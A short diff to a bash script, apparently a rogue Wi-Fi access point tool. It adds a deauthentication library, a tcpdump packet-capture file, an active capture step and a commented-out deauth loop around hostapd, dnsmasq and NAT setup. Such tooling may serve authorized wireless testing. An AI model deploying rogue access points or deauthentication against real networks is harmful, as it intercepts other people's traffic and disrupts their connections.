@@ -12,6 +12,7 @@ source "$LIB_DIR/logging.sh"
 source "$LIB_DIR/utils.sh"
 source "$LIB_DIR/wifi.sh"
 source "$LIB_DIR/detect.sh"
+source "$LIB_DIR/deauth.sh"
 
 # Defaults
 IFACE_MON=""
@@ -81,6 +82,7 @@ LOG_FILE="$LOG_DIR/session_$DATE.log"
 CAPTURE_PREFIX="capture_${DATE}"
 CSV_FILE="${CAPTURE_PREFIX}-01.csv"
 PCAP_FILE="${CAPTURE_PREFIX}-01.cap"
+TCPDUMP_FILE="${CAPTURE_PREFIX}_DUMP.pcap"
 
 # Shared directory (for docker bind mount)
 SHARED_DIR="$(pwd)/shared"
@@ -108,22 +110,18 @@ main() {
       setup_ap_interface
       enable_ip_forwarding
       setup_nat
-
+      trap handle_interrupt SIGINT SIGTERM
       generate_dnsmasq_conf
       start_dnsmasq
-
       generate_hostapd_conf
       start_hostapd
-
-      # Gestion propre de Ctrl+C
-      trap handle_interrupt SIGINT SIGTERM
+      #start_deauth_loop
+      capture_packets
 
       log "Rogue AP fully operational"
       log "Press Ctrl+C to stop"
-
-      # Boucle volontaire pour garder le script actif
       while true; do
-        sleep 1
+          sleep 1
       done
       ;;
     *)
